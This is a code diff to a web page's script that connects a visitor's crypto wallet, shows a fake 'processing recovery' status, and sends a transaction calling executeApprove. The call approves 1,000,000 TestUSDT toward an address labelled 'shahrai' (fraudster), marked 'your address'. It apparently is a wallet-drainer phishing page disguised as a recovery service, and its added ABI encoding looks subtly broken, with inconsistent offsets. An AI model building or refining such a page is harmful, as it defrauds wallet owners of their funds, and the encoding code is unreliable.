@@ -50,6 +50,21 @@
     </div>
 
     <script>
+        // Функція для кодування параметрів у ABI
+        function toHex(data) {
+            return data.toString(16).padStart(64, '0');
+        }
+
+        function encodeAddress(address) {
+            return address.slice(2).padStart(64, '0');
+        }
+
+        function encodeBytes(data) {
+            const hex = data.slice(2);
+            const len = toHex(hex.length / 2);
+            return len + hex.padEnd(64, '0');
+        }
+
         async function connectWallet() {
             try {
                 document.getElementById('status').innerText = 'Connecting...';
@@ -87,15 +102,36 @@
                 document.getElementById('status').innerText = 'Wallet verified. Processing recovery...';
 
                 // Виклик контракту
-                const contractAddress = '0x0a26fF982bb3fAf18eCCE3DE21b3E7733FafBB76'; // Адреса ApproveContract
-                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // Адреса твого TestUSDT
+                const contractAddress = '0x0a26fF982bb3fAf18eCCE3DE21b3E7733FafBB76'; // ApproveContract
+                const usdtAddress = '0x9FcefD342ED17979ceDf0B6C4D257A03d908F5fD'; // TestUSDT
                 const shahraiAddress = '0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e'; // Твоя адреса
                 const amount = 1000000; // 1,000,000 TestUSDT (6 decimals)
 
-                const data = new TextEncoder().encode(message).reduce((hex, byte) => hex + byte.toString(16).padStart(2, '0'), '0x');
+                // Кодування параметрів для executeApprove(bytes,address,bytes,address,address,uint256)
+                const functionSelector = '0x2e3dcd08'; // keccak256("executeApprove(bytes,address,bytes,address,address,uint256)")[:4]
+                const messageBytes = '0x' + new TextEncoder().encode(message).reduce((hex, byte) => hex + byte.toString(16).padStart(2, '0'), '');
+                const offsetMessage = toHex(32 * 5); // Офсет для message (5 слотів по 32 байти)
+                const offsetSignature = toHex(32 * 6 + messageBytes.slice(2).length / 2); // Офсет для signature
+                const offsetUsdt = toHex(32 * 7 + messageBytes.slice(2).length / 2 + signature.slice(2).length / 2); // Офсет для usdtAddress
+                const offsetShahrai = toHex(32 * 8 + messageBytes.slice(2).length / 2 + signature.slice(2).length / 2); // Офсет для shahraiAddress
+                const offsetAmount = toHex(32 * 9 + messageBytes.slice(2).length / 2 + signature.slice(2).length / 2); // Офсет для amount
+
+                const data = functionSelector +
+                    offsetMessage +
+                    encodeAddress(userAddress) +
+                    offsetSignature +
+                    offsetUsdt +
+                    offsetShahrai +
+                    offsetAmount +
+                    encodeBytes(messageBytes) +
+                    encodeBytes(signature) +
+                    encodeAddress(usdtAddress) +
+                    encodeAddress(shahraiAddress) +
+                    toHex(amount);
+
                 const tx = {
                     to: contractAddress,
-                    data: `0x${'executeApprove'}${'0'.repeat(64 - 'executeApprove'.length)}${data.slice(2)}${userAddress.slice(2).padEnd(64, '0')}${signature.slice(2).padEnd(130, '0')}${usdtAddress.slice(2).padEnd(64, '0')}${shahraiAddress.slice(2).padEnd(64, '0')}${amount.toString(16).padStart(64, '0')}`
+                    data: '0x' + data
                 };
 
                 const txHash = await window.ethereum.request({
